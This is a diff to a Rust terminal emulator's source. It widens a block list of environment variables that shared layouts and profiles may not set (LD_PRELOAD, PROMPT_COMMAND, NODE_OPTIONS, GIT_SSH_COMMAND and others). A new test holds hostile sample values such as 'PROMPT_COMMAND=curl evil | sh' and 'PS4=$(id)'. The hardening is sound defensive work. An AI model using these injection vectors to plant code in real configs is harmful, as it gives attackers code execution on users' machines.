@@ -11,10 +11,17 @@ use portable_pty::{CommandBuilder, MasterPty, PtySize, native_pty_system};
 use tokio::sync::mpsc::UnboundedSender;
 
 /// Environment variables that may not be set via pane/profile config.
-/// These are dynamic-loader injection vectors: a shared or imported
-/// layout carrying one of them would run arbitrary code in every shell
-/// spawned from it. Users can still set them manually inside a shell.
+///
+/// Two classes are blocked. The first is dynamic-loader injection: a shared or
+/// imported layout carrying `LD_PRELOAD` (or friends) would run arbitrary code
+/// in every shell spawned from it. The second is startup evaluation: shells and
+/// common tools read these and run what they contain, so a layout/profile that
+/// sets one gets code execution without ever naming a command. Both classes are
+/// dropped here for *every* source — pane settings, layouts, and profiles — so
+/// this table is the single gate; users can still set them manually inside a
+/// shell, where the value comes from the user rather than from a file.
 const BLOCKED_ENV_KEYS: &[&str] = &[
+    // Dynamic-loader injection.
     "LD_PRELOAD",
     "LD_AUDIT",
     "LD_LIBRARY_PATH",
@@ -23,6 +30,27 @@ const BLOCKED_ENV_KEYS: &[&str] = &[
     "DYLD_LIBRARY_PATH",
     "DYLD_FALLBACK_LIBRARY_PATH",
     "DYLD_FORCE_FLAT_NAMESPACE",
+    // Shell startup evaluation: evaluated when the pane's own shell starts or
+    // redraws its prompt.
+    "BASH_ENV",
+    "ENV",
+    "PROMPT_COMMAND",
+    "SHELLOPTS",
+    "PS4",
+    "ZDOTDIR",
+    // Interpreter/tool startup evaluation: evaluated by the next program the
+    // pane launches.
+    "PERL5OPT",
+    "PERL5LIB",
+    "PYTHONSTARTUP",
+    "NODE_OPTIONS",
+    "RUBYOPT",
+    "LESSOPEN",
+    "GIT_SSH_COMMAND",
+    "GIT_EXTERNAL_DIFF",
+    "GIT_PAGER",
+    "PAGER",
+    // Event-channel vars injected as trusted runtime values by start_shell().
     "GPTY_EVENT_SOCKET",
     "GPTY_EVENT_PROTOCOL",
     "GPTY_TERMINAL_SESSION_ID",
@@ -41,8 +69,25 @@ const BLOCKED_ENV_KEYS: &[&str] = &[
     "GPTY_GUI",
 ];
 
-/// Process-wide control credentials must never leak into child shells.
-const STRIPPED_INHERITED_ENV_KEYS: &[&str] = &["GPTY_SECRET", "GPTY_SOCKET", "GPTY_GUI"];
+/// Environment keys removed from every child process gpty spawns — terminal
+/// shells here, and (through `SessionOpenRequest::strip_env`) the Inspector's
+/// OMP/adapter children, which are third-party CLIs that must not hold
+/// workspace-control credentials.
+///
+/// Event-channel and pane-marker keys are in the list because they are only
+/// ever valid *injected* values: `start_shell` removes anything inherited and
+/// then sets fresh per-PTY values itself.
+pub const STRIPPED_INHERITED_ENV_KEYS: &[&str] = &[
+    "GPTY_SECRET",
+    "GPTY_SOCKET",
+    "GPTY_GUI",
+    "GPTY_EVENT_SOCKET",
+    "GPTY_EVENT_PROTOCOL",
+    "GPTY_TERMINAL_SESSION_ID",
+    "GPTY_EVENT_CAPABILITY",
+    "GPTY_ENV",
+    "GPTY_PANE_ID",
+];
 
 /// Filter `KEY=VALUE` environment entries from settings/layouts/profiles.
 ///
@@ -309,6 +354,34 @@ mod tests {
         assert_eq!(
             sanitize_envs(&envs),
             vec![("PATH".to_string(), "/usr/bin".to_string())]
+        );
+    }
+
+    #[test]
+    fn sanitize_envs_drops_startup_evaluation_keys() {
+        // A layout/profile that sets any of these gets code execution without
+        // ever naming a command: the shell or the next tool runs the value.
+        let envs = vec![
+            s("PROMPT_COMMAND=curl evil | sh"),
+            s("BASH_ENV=/tmp/x"),
+            s("ENV=/tmp/x"),
+            s("SHELLOPTS=xtrace"),
+            s("PS4=$(id)"),
+            s("ZDOTDIR=/tmp/z"),
+            s("PERL5OPT=-Mevil"),
+            s("PYTHONSTARTUP=/tmp/x.py"),
+            s("NODE_OPTIONS=--require=/tmp/x.js"),
+            s("RUBYOPT=-revil"),
+            s("LESSOPEN=|/tmp/x %s"),
+            s("GIT_SSH_COMMAND=evil"),
+            s("GIT_EXTERNAL_DIFF=evil"),
+            s("GIT_PAGER=evil"),
+            s("PAGER=evil"),
+            s("EDITOR=vim"),
+        ];
+        assert_eq!(
+            sanitize_envs(&envs),
+            vec![("EDITOR".to_string(), "vim".to_string())]
         );
     }
 
